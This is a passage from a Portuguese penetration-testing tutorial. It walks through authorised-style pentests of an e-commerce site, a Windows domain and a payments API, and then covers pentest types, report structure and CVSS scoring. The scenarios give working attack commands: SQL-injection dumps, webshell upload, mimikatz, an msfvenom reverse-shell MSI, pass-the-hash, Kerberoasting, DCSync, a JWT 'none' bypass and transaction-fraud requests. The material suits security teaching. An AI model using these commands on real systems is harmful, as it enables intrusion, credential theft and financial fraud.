nikto -h https://exemplo.com -evasion 1
# 1 = Random URI encoding

# 5. Scan com tuning (focar em testes específicos)
nikto -h https://exemplo.com -Tuning 6
# 0 = File Upload
# 1 = Interesting File
# 2 = Misconfiguration / Default File
# 3 = Information Disclosure
# 4 = Injection (XSS/Script/HTML)
# 5 = Remote File Retrieval
# 6 = Denial of Service
# 7 = Remote File Retrieval - Inside Web Root
# 8 = Command Execution / Remote Shell
# 9 = SQL Injection
# x = Reverse Tuning (excluir testes)

# 6. Scan através de proxy (Burp Suite)
nikto -h https://exemplo.com -useproxy http://127.0.0.1:8080

# 7. Scan apenas de headers de segurança
nikto -h https://exemplo.com -Plugins headers

# Output:
# - Missing security header: X-Frame-Options
# - Missing security header: X-Content-Type-Options
# - Missing security header: Content-Security-Policy
# - Missing security header: Strict-Transport-Security
```

---

## 🎯 Exemplos Práticos

### Exemplo 1: Pentest de Aplicação Web E-commerce

**Cenário**: Você foi contratado para realizar pentest de **black box** em uma aplicação e-commerce. O cliente quer saber se há vulnerabilidades que poderiam permitir acesso a dados de clientes ou manipulação de pedidos.

**Escopo autorizado:**
- `https://shop.exemplo.com` (aplicação principal)
- `https://api.exemplo.com` (API REST)
- Credenciais de teste fornecidas: `testuser@exemplo.com` / `Test@2024`

**Passos**:

**1. Reconhecimento Passivo (OSINT)**
```bash
# Buscar subdomínios
subfinder -d exemplo.com | tee subdominios.txt
# Output: shop.exemplo.com, api.exemplo.com, admin.exemplo.com

# Buscar tecnologias usadas
whatweb https://shop.exemplo.com
# Output: Apache 2.4.41, PHP 7.4.3, WordPress 6.1.1

# Buscar secrets no GitHub
truffleHog https://github.com/empresa-exemplo/shop --regex
# Output: [FOUND] AWS_SECRET_KEY em config/deploy.yml

# Buscar emails de desenvolvedores (para phishing simulado)
theHarvester -d exemplo.com -b linkedin,google
# Output: dev@exemplo.com, admin@exemplo.com
```

**2. Reconhecimento Ativo (Varredura)**
```bash
# Port scan
nmap -sS -sV -p- shop.exemplo.com
# Portas abertas: 22 (SSH), 80 (HTTP), 443 (HTTPS), 3306 (MySQL) ⚠️

# Descobrir diretórios
gobuster dir -u https://shop.exemplo.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# Encontrado: /admin, /backup, /.git, /api-docs

# Scan de vulnerabilidades web
nikto -h https://shop.exemplo.com
# Findings:
# - Missing security headers
# - /.git/config accessible
# - /backup.sql accessible
```

**3. Análise de Vulnerabilidades**
```bash
# Testar SQL Injection na busca de produtos
sqlmap -u "https://shop.exemplo.com/search?q=laptop" --batch --dbs
# [VULNERABLE] GET parameter 'q' is injectable
# Databases: information_schema, mysql, shop_production

# Testar XSS no nome do produto
# Payload: <script>alert(document.cookie)</script>
# Resultado: ✅ Stored XSS confirmado (cookie exfiltrado)

# Verificar .git exposto
git-dumper https://shop.exemplo.com/.git ./git-dump
cd git-dump
grep -r "password" .
# Encontrado: .env:DB_PASSWORD=Prod2024!
```

**4. Exploração**
```bash
# Explorar SQLi para acessar dados de clientes
sqlmap -u "https://shop.exemplo.com/search?q=laptop" \
       -D shop_production -T customers \
       --dump --batch --threads=5

# Resultado: 15.432 registros de clientes exportados
# Campos: id, email, password_hash, cpf, address

# Testar acesso ao MySQL exposto
mysql -h shop.exemplo.com -u root -p
# Senha encontrada no .git: Prod2024!
# ✅ ACESSO OBTIDO AO BANCO DE PRODUÇÃO!

# Modificar preço de produto via SQLi
sqlmap -u "https://shop.exemplo.com/search?q=laptop" \
       --sql-query="UPDATE products SET price=1.00 WHERE id=123"
# Resultado: Produto de R$ 5.000 agora custa R$ 1,00
```

**5. Pós-Exploração**
```bash
# Escalar privilégios no servidor web (via shell upload)
# Upload de webshell via vulnerabilidade de file upload
curl -X POST https://shop.exemplo.com/upload \
     -F "file=@webshell.php" \
     -H "Cookie: session=..."

# Acesso ao shell
curl https://shop.exemplo.com/uploads/webshell.php?cmd=whoami
# Output: www-data

# Buscar credenciais no servidor
curl https://shop.exemplo.com/uploads/webshell.php?cmd=cat+/var/www/html/.env
# DB_PASSWORD=Prod2024!
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Resultado esperado**:

**📊 Resumo de Vulnerabilidades Encontradas:**

| # | Vulnerabilidade | Severidade | Impacto |
|---|-----------------|------------|---------|
| 1 | **SQL Injection** em `/search` | 🔴 Crítica | Acesso completo ao banco de dados, exfiltração de 15k registros de clientes |
| 2 | **MySQL exposto** externamente (porta 3306) | 🔴 Crítica | Acesso direto ao banco com credenciais vazadas |
| 3 | **Repositório .git exposto** | 🔴 Crítica | Credenciais de produção vazadas (DB, AWS) |
| 4 | **Stored XSS** em nome de produto | 🟠 Alta | Session hijacking, phishing de administradores |
| 5 | **File Upload sem validação** | 🟠 Alta | Upload de webshell, RCE no servidor |
| 6 | **Backup de banco exposto** (`/backup.sql`) | 🟠 Alta | Exfiltração completa do banco via download direto |
| 7 | **Falta de rate limiting** em login | 🟡 Média | Brute force de senhas viável |
| 8 | **Headers de segurança ausentes** | 🟡 Média | Clickjacking, MIME sniffing |

**Impacto ao negócio:**
- 💰 **Financeiro**: Modificação de preços (prejuízo direto)
- 🔐 **LGPD**: Exfiltração de CPF de 15k clientes (multa de até R$ 50MM)
- 🛡️ **Reputação**: Perda de confiança de clientes
- ⚖️ **Legal**: Processos judiciais de clientes afetados

### Exemplo 2: Pentest Interno de Infraestrutura

**Cenário**: Você está dentro da rede corporativa (como se tivesse obtido acesso via phishing). Objetivo: **movimentar-se lateralmente e chegar ao Domain Controller**.

**Situação inicial:**
- Acesso a 1 workstation Windows 10 como usuário comum (`CORP\usuario`)
- IP: `192.168.10.50`
- Subnet: `192.168.10.0/24`

**Passos**:

**1. Reconhecimento da Rede Interna**
```powershell
# Descobrir hosts ativos
arp -a
nmap -sn 192.168.10.0/24

# Output:
# 192.168.10.1   - Gateway
# 192.168.10.10  - DC01 (Domain Controller)
# 192.168.10.20  - FILE-SERVER
# 192.168.10.30  - DB-SERVER
# 192.168.10.50  - WKS-01 (sua máquina)

# Identificar Domain Controller
nltest /dclist:CORP
# Output: DC01.corp.local (192.168.10.10)

# Enumerar compartilhamentos de rede
net view /domain:CORP
net view \\DC01 /all
```

**2. Enumeração de Credenciais**
```powershell
# Buscar credenciais salvas no navegador
powershell -c "Get-ChildItem -Path $env:LOCALAPPDATA\Google\Chrome\'User Data'\Default -Filter 'Login Data'"

# Buscar senhas em arquivos
dir /s /b C:\*.txt | findstr /i password
dir /s /b C:\*.xml | findstr /i password

# Enumerar usuários logados recentemente
qwinsta
query user

# Dumpar credenciais da memória (requer admin local)
mimikatz.exe
sekurlsa::logonpasswords
# Output: Credenciais de CORP\admin em plaintext!
```

**3. Escalação de Privilégios Local**
```powershell
# Verificar privilégios atuais
whoami /priv
whoami /groups

# Buscar serviços vulneráveis (unquoted service path)
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Explorar AlwaysInstallElevated (se habilitado)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Se ambos = 1, podemos instalar MSI com privilégios SYSTEM!

# Criar payload MSI malicioso
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.10.50 LPORT=4444 \
         -f msi -o evil.msi

# Instalar (ganha SYSTEM)
msiexec /quiet /qn /i evil.msi
```

**4. Movimento Lateral (Lateral Movement)**
```powershell
# Pass-the-Hash para FILE-SERVER
# (usar hash capturado do mimikatz)
pth-winexe -U CORP/admin%aad3b435b51404eeaad3b435b51404ee:hash \
           //192.168.10.20 cmd
# ✅ Shell no FILE-SERVER obtido!

# Enumerar compartilhamentos sensíveis
net share
dir \\FILE-SERVER\Financeiro
# Encontrado: Planilhas com CPFs, cartões de crédito

# Pivoting para DB-SERVER (não acessível da rede externa)
ssh -L 1433:192.168.10.30:1433 usuario@192.168.10.50
# Agora localhost:1433 acessa DB-SERVER:1433
```

**5. Ataque ao Domain Controller**
```powershell
# Kerberoasting - Extrair hashes de Service Accounts
impacket-GetUserSPNs CORP/usuario:senha -dc-ip 192.168.10.10 -request
# Output: Hash do service account svc_sql

# Crackar hash offline
hashcat -m 13100 -a 0 hash.txt rockyou.txt
# Cracked: svc_sql:Summer2023!

# Verificar se svc_sql tem privilégios no DC
crackmapexec smb 192.168.10.10 -u svc_sql -p Summer2023! --shares
# ✅ svc_sql é Domain Admin!

# DCSync - Dumpar todas as credenciais do AD
impacket-secretsdump CORP/svc_sql:Summer2023!@192.168.10.10
# Output: Hashes NTLM de TODOS os usuários do domínio, incluindo Administrator

# Pass-the-Hash como Domain Admin
pth-winexe -U CORP/Administrator%aad3b435b51404eeaad3b435b51404ee:hash \
           //192.168.10.10 cmd
# 🎉 Shell no Domain Controller como Administrator!
```

**Resultado esperado**:

**🏆 Objetivos Alcançados:**
1. ✅ Escalação de privilégios local (usuário → SYSTEM)
2. ✅ Movimento lateral (workstation → file server → db server)
3. ✅ Comprometimento do Domain Controller
4. ✅ Exfiltração de credenciais de 500+ usuários do domínio
5. ✅ Acesso a compartilhamentos sensíveis (financeiro, RH)

**Vulnerabilidades exploradas:**
- **AlwaysInstallElevated habilitado** (privilege escalation)
- **Service Account com senha fraca** (Kerberoasting)
- **Service Account é Domain Admin** (misconfiguration crítico)
- **Credenciais em plaintext na memória** (falta de Credential Guard)

### Exemplo 3: API REST Pentest

**Cenário**: Testar segurança de uma **API REST de pagamentos** que processa transações financeiras.

**Escopo:**
- Base URL: `https://api.exemplo.com/v1/`
- Autenticação: JWT Token
- Endpoints: `/auth/login`, `/users/{id}`, `/transactions`, `/cards`

**Passos**:

**1. Enumeração de Endpoints**
```bash
# Buscar documentação da API
curl https://api.exemplo.com/v1/swagger.json
curl https://api.exemplo.com/v1/openapi.yaml
curl https://api.exemplo.com/v1/docs

# Fuzzing de endpoints
ffuf -u https://api.exemplo.com/v1/FUZZ \
     -w /usr/share/wordlists/api/api-endpoints.txt \
     -mc 200,201,401,403
# Encontrado: /admin, /internal, /debug
```

**2. Teste de Autenticação**
```bash
# Login normal
curl -X POST https://api.exemplo.com/v1/auth/login \
     -H "Content-Type: application/json" \
     -d '{"email":"test@exemplo.com","password":"Test123"}'

# Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "userId": 123
}

# Decodificar JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | jwt decode -
# Payload:
{
  "userId": 123,
  "role": "user",
  "iat": 1704063600,
  "exp": 1704150000
}

# Testar JWT com "none" algorithm (bypass de assinatura)
# Modificar header: "alg":"none"
# Modificar payload: "role":"admin"
# Remover assinatura
curl https://api.exemplo.com/v1/admin/users \
     -H "Authorization: Bearer MODIFIED_TOKEN"
# ✅ VULNERÁVEL: Acesso ao endpoint /admin sem assinatura válida!
```

**3. Testes de Autorização (IDOR/BOLA)**
```bash
# Acessar perfil do próprio usuário
curl https://api.exemplo.com/v1/users/123 \
     -H "Authorization: Bearer $TOKEN"
# Response: Dados do usuário 123 (seu usuário)

# Testar IDOR (Insecure Direct Object Reference)
curl https://api.exemplo.com/v1/users/124 \
     -H "Authorization: Bearer $TOKEN"
# ✅ VULNERÁVEL: Acesso aos dados do usuário 124 sem validação!

# Enumerar todos os usuários
for i in {1..1000}; do
  curl -s https://api.exemplo.com/v1/users/$i \
       -H "Authorization: Bearer $TOKEN" \
       | jq '.email, .cpf'
done
# Resultado: 1000 emails e CPFs exfiltrados
```

**4. Teste de Lógica de Negócio**
```bash
# Criar transação de R$ 100
curl -X POST https://api.exemplo.com/v1/transactions \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "fromUserId": 123,
       "toUserId": 456,
       "amount": 100.00
     }'

# Testar valor negativo (creditar sua conta)
curl -X POST https://api.exemplo.com/v1/transactions \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "fromUserId": 456,
       "toUserId": 123,
       "amount": -1000.00
     }'
# ✅ VULNERÁVEL: Aceita valor negativo, creditou R$ 1.000 na sua conta!

# Race condition - enviar transação duplicada simultaneamente
for i in {1..10}; do
  curl -X POST https://api.exemplo.com/v1/transactions \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json" \
       -d '{"fromUserId":123,"toUserId":456,"amount":10.00}' &
done
wait
# Resultado: Saldo debitado 1 vez, mas creditado 10 vezes!
```

**5. Teste de Mass Assignment**
```bash
# Atualizar perfil (apenas nome)
curl -X PATCH https://api.exemplo.com/v1/users/123 \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"João Silva"}'

# Testar mass assignment (enviar campo não esperado)
curl -X PATCH https://api.exemplo.com/v1/users/123 \
     -H "Authorization: Bearer $TOKEN" \
     -H "Content-Type: application/json" \
     -d '{
       "name":"João Silva",
       "role":"admin",
       "isVerified":true,
       "balance":999999.99
     }'
# ✅ VULNERÁVEL: Aceita campos não esperados, elevou role para admin!
```

**Resultado esperado**:

| Vulnerabilidade | Severidade | Impacto |
|-----------------|------------|---------|
| **JWT "none" algorithm bypass** | 🔴 Crítica | Autenticação completamente bypassada |
| **IDOR em /users/{id}** | 🔴 Crítica | Exfiltração de dados de todos os usuários |
| **Aceita valores negativos** | 🔴 Crítica | Fraude financeira (creditar dinheiro ilimitado) |
| **Race condition em transações** | 🔴 Crítica | Duplicação de créditos, prejuízo financeiro |
| **Mass assignment** | 🟠 Alta | Escalação de privilégios (user → admin) |
| **Falta de rate limiting** | 🟡 Média | Brute force e enumeração viáveis |

---

## 📝 Tipos de Pentest

### Black Box Testing

**Definição**: Teste onde o pentester **não tem NENHUMA informação prévia** sobre o alvo - simula um atacante externo real que conhece apenas o domínio/IP público da empresa. É a simulação mais realista de um ataque, mas também a mais demorada.

**Informações fornecidas:**
- ✅ URL/domínio público ou range de IPs
- ❌ Credenciais de acesso
- ❌ Código-fonte
- ❌ Documentação técnica
- ❌ Arquitetura de infraestrutura

**Vantagens:**
- 🎯 **Realismo máximo**: Simula exatamente o que um atacante real faria
- 👀 **Perspectiva externa**: Mostra o que é visível publicamente
- 🔍 **Descobertas inesperadas**: Pode encontrar ativos esquecidos/desconhecidos

**Desvantagens:**
- ⏱️ **Tempo consumido em reconhecimento**: 30-40% do tempo é OSINT/scanning
- 💰 **Mais caro**: Requer mais horas de trabalho
- 🎯 **Cobertura limitada**: Pode não testar funcionalidades que requerem autenticação profunda

**Quando usar:**
- Simular ataque de **hacker externo** (sem conhecimento interno)
- Testar **segurança perimetral** (firewalls, WAFs, IDS)
- Validar **visibilidade pública** de ativos
- Compliance que exige pentest "no knowledge"

**Exemplo de escopo Black Box:**
```yaml
tipo: Black Box External Pentest
informacoes_fornecidas:
  - "Domain: exemplo.com"
  - "IP range: 203.0.113.0/24"
duracao: "2 semanas"
objetivo: "Simular ataque de atacante externo e tentar obter acesso à rede interna"
```

### White Box Testing

**Definição**: Teste onde o pentester tem **ACESSO COMPLETO** a todas as informações, código-fonte, credenciais e documentação. Simula um **insider malicioso** (funcionário comprometido) ou foca em **profundidade de análise** ao invés de realismo de ataque.

**Informações fornecidas:**
- ✅ Código-fonte completo (acesso ao repositório Git)
- ✅ Credenciais de múltiplos níveis (user, admin, root)
- ✅ Diagramas de arquitetura e infraestrutura
- ✅ Documentação técnica (APIs, configurações)
- ✅ Acesso à rede interna (VPN)

**Vantagens:**
- 🔬 **Cobertura máxima**: Testa 100% da aplicação/infraestrutura
- ⚡ **Mais eficiente**: Menos tempo em reconhecimento, mais tempo em análise
- 🐛 **Encontra mais vulnerabilidades**: Acessa áreas que Black Box não alcançaria
- 💻 **Code review de segurança**: Detecta falhas no código-fonte diretamente

**Desvantagens:**
- 🎭 **Menos realista**: Atacante real não teria tanto acesso inicial
- 💸 **Pode custar mais**: Análise profunda de código é trabalhosa
- ⚠️ **Pode gerar muitos falsos positivos**: Acesso excessivo pode distorcer resultados

**Quando usar:**
- **Code review de segurança** antes de release
- Auditorias de **compliance rigorosas** (PCI-DSS Level 1, SOC2 Type II)
- Após **incidente de segurança** (análise forense completa)
- Validar **correções de vulnerabilidades** anteriores

**Exemplo de escopo White Box:**
```yaml
tipo: White Box Internal Pentest + Code Review
informacoes_fornecidas:
  - "Acesso ao repositório: https://github.com/empresa/app"
  - "Credenciais admin: admin@exemplo.com / Senha123"
  - "VPN credentials para rede interna"
  - "Documentação da API: https://docs.exemplo.com"
  - "Diagrama de arquitetura AWS"
duracao: "3 semanas"
objetivo: "Análise profunda de segurança incluindo code review de aplicação Node.js e infraestrutura AWS"
```

### Gray Box Testing

**Definição**: **Meio-termo entre Black Box e White Box**. O pentester tem **acesso parcial** - normalmente credenciais de usuário comum e documentação básica, mas sem acesso ao código-fonte ou privilégios administrativos. É o **mais comum no mundo real** por balancear realismo e eficiência.

**Informações fornecidas:**
- ✅ Credenciais de usuário comum (não admin)
- ✅ Documentação básica da API/aplicação
- ✅ URLs de ambientes de staging/dev (opcional)
- ❌ Código-fonte
- ❌ Credenciais administrativas
- ❌ Acesso à infraestrutura interna

**Vantagens:**
- ⚖️ **Equilibrado**: Balanceia realismo com eficiência
- 💰 **Custo-benefício**: Mais barato que White Box, mais efetivo que Black Box
- 🎯 **Foca em exploração**: Menos tempo em recon, mais tempo testando vulnerabilidades
- 🔐 **Testa autenticação e autorização**: Perfeito para testar privilege escalation e IDOR

**Desvantagens:**
- 🎭 **Menos realista que Black Box**: Atacante não teria credenciais inicialmente
- 🔍 **Menos cobertura que White Box**: Áreas não autenticadas podem ser ignoradas

**Quando usar:**
- Maioria dos **pentests corporativos** (é o padrão de mercado)
- Testar **lógica de negócio** e **controles de acesso**
- Validar **privilege escalation** (user → admin)
- Simular **atacante com acesso inicial** (ex: phishing bem-sucedido)

**Exemplo de escopo Gray Box:**
```yaml
tipo: Gray Box Web Application Pentest
informacoes_fornecidas:
  - "URL: https://app.exemplo.com"
  - "Credenciais de teste: user01@exemplo.com / TestUser2024"
  - "Swagger da API: https://api.exemplo.com/docs"
duracao: "10 dias"
objetivo: "Testar controles de acesso, lógica de negócio e vulnerabilidades web com acesso de usuário comum"
```

**Comparação Visual:**

```
┌────────────────────────────────────────────────────────────────┐
│          Comparação: Black vs Gray vs White Box               │
└────────────────────────────────────────────────────────────────┘

┌─────────────────┬──────────────┬──────────────┬──────────────┐
│ Aspecto         │ Black Box    │ Gray Box     │ White Box    │
├─────────────────┼──────────────┼──────────────┼──────────────┤
│ Informações     │ Nenhuma      │ Parciais     │ Completas    │
│ Credenciais     │ ❌ Não       │ ✅ User      │ ✅ Admin     │
│ Código-fonte    │ ❌ Não       │ ❌ Não       │ ✅ Sim       │
│ Documentação    │ ❌ Não       │ ✅ Básica    │ ✅ Completa  │
│ Realismo        │ ⭐⭐⭐⭐⭐    │ ⭐⭐⭐       │ ⭐⭐         │
│ Cobertura       │ ⭐⭐         │ ⭐⭐⭐⭐     │ ⭐⭐⭐⭐⭐    │
│ Custo           │ $ $ $ $      │ $ $ $        │ $ $ $ $ $    │
│ Duração         │ Longa        │ Média        │ Longa        │
│ Uso comum       │ 20%          │ 60%          │ 20%          │
└─────────────────┴──────────────┴──────────────┴──────────────┘

Simula:
Black Box → 🌐 Hacker externo desconhecido
Gray Box  → 👤 Usuário comprometido ou insider com acesso limitado
White Box → 🔓 Insider malicioso ou análise forense completa
```

### Tipos Especializados de Pentest

Além dos 3 tipos principais (Black/Gray/White), existem **pentests especializados** para contextos específicos:

#### 1. Red Team Engagement
**Definição**: Simulação de **APT (Advanced Persistent Threat)** - ataque prolongado e sofisticado por adversário altamente capacitado. Combina pentest técnico com **engenharia social, physical security e evasão de defesas**.

**Duração típica**: 4-12 semanas (ataques persistentes)

**Táticas usadas:**
- Phishing/spear phishing
- Physical intrusion (invasão física)
- Supply chain attacks
- Social engineering complexo
- Evasão de EDR/SIEM/Blue Team

**Objetivo**: Testar **detecção e resposta** do Blue Team (SOC), não apenas encontrar vulnerabilidades.

#### 2. Mobile Application Pentest
**Definição**: Foco em aplicações móveis (iOS/Android).

**Testes incluem:**
- Análise estática do APK/IPA (decompilar app)
- Hardcoded secrets, API keys
- Certificate pinning bypass
- Jailbreak/root detection bypass
- Insecure data storage
- Man-in-the-middle de requests

**Ferramentas**: MobSF, Frida, Objection, Burp Suite Mobile Assistant

#### 3. IoT/Hardware Pentest
**Definição**: Teste de dispositivos IoT (câmeras, sensores, wearables).

**Testes incluem:**
- Firmware analysis (binwalk, Ghidra)
- UART/JTAG debugging
- Radio frequency analysis (SDR)
- Default credentials
- Insecure protocols (Telnet, FTP)

**Ferramentas**: Bus Pirate, Logic Analyzer, Wireshark, Binwalk

#### 4. Cloud Pentest
**Definição**: Foco em infraestrutura cloud (AWS, Azure, GCP).

**Testes incluem:**
- IAM misconfiguration
- S3 buckets públicos
- Excessive permissions (privilege escalation)
- Secrets em metadata service (SSRF)
- Container escape

**Ferramentas**: ScoutSuite, Prowler, Pacu, CloudFox

#### 5. API Pentest
**Definição**: Foco exclusivo em APIs (REST, GraphQL, SOAP).

**Testes incluem:**
- BOLA/IDOR (broken object level authorization)
- Mass assignment
- Rate limiting bypass
- GraphQL introspection
- API key leakage

**Ferramentas**: Postman, Insomnia, OWASP ZAP, Burp Suite, Arjun

## 📊 Relatórios de Pentest

### Estrutura de um Relatório

Um relatório de pentest de qualidade é **tão importante quanto a execução do teste**. Um pentest sem relatório claro e acionável tem **valor quase zero** para o cliente. 

**📋 Componentes essenciais:**

```markdown
┌────────────────────────────────────────────────────────────────┐
│            Anatomia de um Relatório de Pentest                 │
└────────────────────────────────────────────────────────────────┘

1. CAPA (1 página)
   ├─ Nome do cliente
   ├─ Tipo de pentest (Black/Gray/White Box)
   ├─ Data de execução (início e fim)
   ├─ Versão do relatório (v1.0, v1.1 após retest)
   └─ Classificação: "CONFIDENCIAL - DISTRIBUTION RESTRICTED"

2. SUMÁRIO EXECUTIVO (1-2 páginas) [PARA C-LEVEL/GESTÃO]
   ├─ Objetivo do pentest (em 2-3 frases)
   ├─ Escopo resumido (o que foi testado)
   ├─ Metodologia (OWASP, PTES)
   ├─ 📊 Dashboard visual de vulnerabilidades
   │  └─ Gráfico de pizza: Críticas (3), Altas (7), Médias (12), Baixas (5)
   ├─ ⚠️ Top 3 riscos críticos (em linguagem de negócio)
   │  1. "SQL Injection permite acesso a 50k registros de clientes"
   │  2. "Servidor admin acessível da internet sem autenticação"
   │  3. "Credenciais de produção vazadas no GitHub público"
   ├─ 💰 Impacto potencial ao negócio
   │  └─ "Risco de multa LGPD: até R$ 50MM"
   │  └─ "Possível fraude financeira: ilimitado"
   └─ ✅ Recomendações prioritárias (top 3 ações)
      1. "Desabilitar servidor admin público (0-24h)"
      2. "Implementar prepared statements (7 dias)"
      3. "Revogar e rotacionar credenciais vazadas (imediato)"

3. SUMÁRIO TÉCNICO (1 página) [PARA TIMES TÉCNICOS]
   ├─ Estatísticas detalhadas
   │  ├─ Hosts/IPs testados: 15
   │  ├─ Aplicações web testadas: 3
   │  ├─ Endpoints API testados: 47
   │  ├─ Vulnerabilidades encontradas: 27
   │  └─ Exploits bem-sucedidos: 8
   ├─ Ferramentas utilizadas
   │  └─ Nmap, Burp Suite Pro, SQLMap, Metasploit, Nikto
   ├─ Limitações e exclusões
   │  └─ "DoS/DDoS não executado conforme RoE"
   │  └─ "Sistemas legados (AS/400) fora do escopo"
   └─ Timeline de testes
      └─ Semana 1: Reconhecimento e scanning
      └─ Semana 2: Exploração e pós-exploração
      └─ Dia 10: Notificação de vulnerabilidade crítica
      └─ Semana 3: Documentação e relatório

4. METODOLOGIA (2-3 páginas)
   ├─ Framework usado (OWASP Testing Guide v4.2)
   ├─ Fases executadas
   │  1. Reconhecimento (OSINT, port scanning)
   │  2. Vulnerability Analysis
   │  3. Exploitation
   │  4. Post-Exploitation
   │  5. Reporting
   ├─ Tipos de testes executados
   │  ├─ [✅] Authentication Testing
   │  ├─ [✅] Authorization Testing
   │  ├─ [✅] Session Management
   │  ├─ [✅] Input Validation (SQLi, XSS, XXE)
   │  ├─ [✅] Business Logic Testing
   │  ├─ [❌] Physical Security (fora do escopo)
   │  └─ [❌] Social Engineering (fora do escopo)
   └─ Regras de Engajamento (Rules of Engagement)
      ├─ ✅ Exploitation permitido (PoC completo)
      ├─ ❌ DoS/DDoS proibido
      ├─ ❌ Exfiltração de dados reais proibida (apenas screenshots)
      └─ ⚠️ Notificação imediata de vulnerabilidades críticas

5. TABELA CONSOLIDADA DE VULNERABILIDADES (1-2 páginas)

| # | Título | Severidade | CVSS | Componente | Status |
|---|--------|------------|------|------------|--------|
| 1 | SQL Injection em /search | 🔴 Crítica | 9.8 | Web App | Aberto |
| 2 | Admin panel sem autenticação | 🔴 Crítica | 10.0 | admin.exemplo.com | Aberto |
| 3 | Credenciais no GitHub | 🔴 Crítica | 9.1 | Repositório público | Corrigido |
| 4 | XSS Stored em comentários | 🟠 Alta | 7.1 | Web App | Aberto |
| ... | ... | ... | ... | ... | ... |

6. ACHADOS DETALHADOS (10-50 páginas) [BULK DO RELATÓRIO]
   Para CADA vulnerabilidade:
   ├─ Título claro e descritivo
   ├─ Severidade com CVSS score calculado
   ├─ Resumo executivo (2-3 linhas)
   ├─ Descrição técnica detalhada
   ├─ Impacto ao negócio (C-I-A + financeiro/reputacional)
   ├─ Steps to Reproduce (passo a passo reproduzível)
   ├─ 📸 Evidências (screenshots, videos, logs, código)
   ├─ Proof of Concept (código/comandos usados)
   ├─ Recomendações de remediação (priorizadas)
   │  ├─ Correção imediata (0-7 dias)
   │  ├─ Correção permanente (7-30 dias)
   │  └─ Melhorias de longo prazo (30-90 dias)
   ├─ Referências técnicas (CVE, CWE, OWASP, CAPEC)
   └─ Timeline de descoberta

7. APÊNDICES (variável)
   ├─ A. Outputs de ferramentas (Nmap, Nikto, etc)
   ├─ B. Lista completa de hosts/serviços descobertos
   ├─ C. Checklist de testes executados (OWASP Testing Guide)
   ├─ D. Scripts e exploits desenvolvidos
   ├─ E. Scope document assinado
   └─ F. Glossário de termos técnicos
```

### Priorização de Vulnerabilidades

A priorização correta de vulnerabilidades é **crítica** para garantir que o cliente foque esforços de correção no que realmente importa. Use **CVSS (Common Vulnerability Scoring System)** como base, mas **ajuste baseado em contexto de negócio**.

**📊 Sistema CVSS v3.1:**

```
┌────────────────────────────────────────────────────────────────┐
│              CVSS v3.1 Scoring System                          │
└────────────────────────────────────────────────────────────────┘

Score: 0.0 - 10.0 (quanto maior, mais severo)

📐 Cálculo baseado em 8 métricas:

BASE METRICS (características intrínsecas da vulnerabilidade):
1. Attack Vector (AV): Network / Adjacent / Local / Physical
2. Attack Complexity (AC): Low / High
3. Privileges Required (PR): None / Low / High
4. User Interaction (UI): None / Required
5. Scope (S): Unchanged / Changed
6. Confidentiality (C): None / Low / High
7. Integrity (I): None / Low / High
8. Availability (A): None / Low / High

TEMPORAL METRICS (mudam com o tempo):
- Exploit Code Maturity: Not Defined / Proof-of-Concept / Functional / High
- Remediation Level: Official Fix / Temporary Fix / Workaround / Unavailable
- Report Confidence: Not Defined / Unknown / Reasonable / Confirmed

ENVIRONMENTAL METRICS (específicos do ambiente):
- Confidentiality Requirement: Low / Medium / High
- Integrity Requirement: Low / Medium / High
- Availability Requirement: Low / Medium / High

┌──────────────────┬────────────┬──────────────────────────────┐
│ CVSS Score       │ Severidade │ SLA de Correção (sugerido)  │
├──────────────────┼────────────┼──────────────────────────────┤
│ 9.0 - 10.0       │ 🔴 Crítica │ 0-7 dias (imediato)          │
│ 7.0 - 8.9        │ 🟠 Alta    │ 7-30 dias                    │
│ 4.0 - 6.9        │ 🟡 Média   │ 30-90 dias                   │
│ 0.1 - 3.9        │ 🔵 Baixa   │ 90+ dias (backlog)           │
│ 0.0              │ ⚪ Info    │ Não requer correção          │
└──────────────────┴────────────┴──────────────────────────────┘
```

**Exemplo de cálculo CVSS:**

```yaml
# Vulnerabilidade: SQL Injection em parâmetro público

Attack Vector: Network (N)           # Acessível da internet
Attack Complexity: Low (L)           # Exploração trivial
Privileges Required: None (N)        # Sem autenticação necessária
User Interaction: None (N)           # Automático, sem interação
Scope: Changed (C)                   # Acesso além do componente vulnerável
Confidentiality: High (H)            # Acesso a todo o banco de dados
Integrity: High (H)                  # Pode modificar dados
Availability: High (H)               # Pode derrubar BD com DROP

CVSS v3.1 Score: 10.0 (CRÍTICA)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

**⚠️ IMPORTANTE: Ajuste baseado em contexto de negócio!**

Exemplo: XSS em página interna de administração **VS** XSS em checkout de e-commerce

```yaml
# Cenário 1: XSS em painel admin interno
CVSS Base: 6.5 (Média)
Justificativa: "Requer autenticação, acesso limitado a admins (50 usuários)"
Prioridade ajustada: 🟡 Média (correção em 30-60 dias)

# Cenário 2: XSS em checkout de e-commerce
CVSS Base: 6.5 (Média)
Contexto de negócio:
  - 100k usuários passam por checkout/dia
  - Processa R$ 5MM/dia em transações
  - Pode roubar dados de cartão de crédito
Prioridade ajustada: 🔴 CRÍTICA (correção imediata)
Justificativa: "Alto impacto financeiro e reputacional apesar de CVSS moderado"
```

**📋 Template de priorização customizado:**

| Vulnerabilidade | CVSS | Severidade Base | Impacto Negócio | Facilidade Exploração | Prioridade Final |
|-----------------|------|-----------------|----------------|----------------------|------------------|
| SQLi em checkout | 9.8 | 🔴 Crítica | 💰💰💰 Alto | ⚡ Trivial | 🔴 P0 (0-24h) |
